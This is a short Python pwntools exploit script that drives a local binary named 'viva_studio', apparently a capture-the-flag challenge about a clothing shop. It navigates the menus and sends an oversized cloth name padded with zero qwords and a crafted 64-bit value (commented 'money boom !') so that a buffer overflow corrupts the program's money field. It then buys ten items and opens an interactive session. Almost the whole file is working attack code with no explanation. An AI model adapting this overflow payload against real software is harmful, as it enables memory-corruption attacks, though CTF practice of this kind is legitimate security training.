from pwn import *
from time import *

context.log_level = 'debug'

s = process('./viva_studio')

def recv_send(msg, q):
    s.recvuntil(msg)
    s.sendline(q)
#    sleep(1)
def buy():    
    recv_send('What number do you like to buy or sell?: ', '1')
    recv_send('Size?: ', '1')
    recv_send('> ', '1') # buy

recv_send('Enter your name: ', 'seongjo')

recv_send('sel: ', '1') # shop

buy()

recv_send('What number do you like to buy or sell?: ', '6') # main menu

recv_send('sel: ', '2') # reform

recv_send('this one? Yes:1 ,No:0\n', '1')

pay = "CLASSIC RIDERS JACKET HA[BLACK]"
pay += p64(0)*8
pay += p64(0x0000000b000ee290) # money boom !

recv_send('change the cloth name: ', pay) # overflow!

recv_send('change the cloth size: ', '1')

recv_send('sel: ', '3')

recv_send('sel: ', '1')

recv_send('What number do you like to buy or sell?: ', '1')

recv_send('Size?: ', '1')

recv_send('> ', '2')

buy()
buy()
buy()
buy()
buy()
buy()
buy()
buy()
buy()
buy() # buy 10 cloth

recv_send('What number do you like to buy or sell?: ', '6')

recv_send('sel: ', '4')

s.interactive()
